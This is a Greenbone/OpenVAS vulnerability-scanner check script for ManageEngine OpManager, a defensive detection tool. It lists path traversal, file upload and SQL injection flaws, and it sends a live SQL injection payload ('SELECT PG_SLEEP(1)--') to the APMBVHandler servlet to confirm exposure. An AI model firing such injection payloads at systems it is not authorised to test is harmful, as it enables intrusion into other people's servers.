# Copyright (C) 2014 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:zohocorp:manageengine_opmanager";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805103");
  script_version("2022-04-14T11:24:11+0000");
  script_cve_id("CVE-2014-7866", "CVE-2014-7868", "CVE-2014-6035");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2022-04-14 11:24:11 +0000 (Thu, 14 Apr 2022)");
  script_tag(name:"creation_date", value:"2014-11-24 16:16:10 +0530 (Mon, 24 Nov 2014)");

  script_name("ManageEngine OpManager Multiple Vulnerabilities (Nov 2014) - Active Check");

  script_tag(name:"summary", value:"ManageEngine OpManager is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Multiple flaws are due to:

  - /servlet/MigrateLEEData script not properly sanitizing user input, specifically path traversal
  style attacks (e.g. '../') supplied via the 'fileName' parameter.

  - /servlet/MigrateCentralData script not properly sanitizing user input, specifically path
  traversal style attacks (e.g. '../') supplied via the 'zipFileName' parameter.

  - /servlet/APMBVHandler script not properly sanitizing user-supplied input to the 'OPM_BVNAME'
  POST parameter.

  - /servlet/DataComparisonServlet script not properly sanitizing user-supplied input to the 'query'
  POST parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to upload arbitrary
  files and execute the script within the file with the privileges of the web server, manipulate SQL
  queries in the backend database, and disclose certain sensitive information.");

  script_tag(name:"affected", value:"ManageEngine OpManager version 11.3/11.4.");

  script_tag(name:"solution", value:"Apply the patches from the referenced links.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/35209");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71001");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71002");
  script_xref(name:"URL", value:"https://support.zoho.com/portal/manageengine/helpcenter/articles/sql-injection-vulnerability-fix");
  script_xref(name:"URL", value:"https://support.zoho.com/portal/manageengine/helpcenter/articles/fix-for-remote-code-execution-via-file-upload-vulnerability");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_manage_engine_opmanager_consolidation.nasl");
  script_mandatory_keys("manageengine/opmanager/http/detected");
  script_require_ports("Services/www", 8060);

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(port: port, cpe: CPE))
  exit(0);

if (dir == "/")
  dir = "";

data = "OPERATION_TYPE=Delete&OPM_BVNAME=aaa'; SELECT PG_SLEEP(1)--";
url = dir + "/servlet/APMBVHandler";

req = http_post_put_req(port: port, url: url, data: data,
                        add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
res = http_keepalive_send_recv(port: port, data: req);

if ("Action=BV_DELETED" >< res && "SELECT PG_SLEEP(1)--" >< res && "Result=Success" >< res &&
    "Result=Failure" >!< res) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);